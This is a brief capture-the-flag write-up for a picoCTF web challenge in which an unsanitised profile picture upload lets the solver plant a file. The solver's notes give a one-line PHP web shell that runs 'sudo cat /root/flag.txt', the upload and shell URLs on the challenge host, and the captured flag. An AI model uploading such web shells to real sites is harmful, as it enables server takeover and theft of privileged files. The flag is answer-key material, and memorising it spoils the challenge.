#### Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

Additional details will be available after launching your challenge instance.
#### Hints 
- File upload was not sanitized
- Whenever you get a shell on a remote machine, check `sudo -l`


```
nuesrto codigo:
<?php echo exec("sudo cat /root/flag.txt");?>

http://standard-pizzas.picoctf.net:64628/upload.php
http://standard-pizzas.picoctf.net:64628/uploads/shell.php
picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94}
```

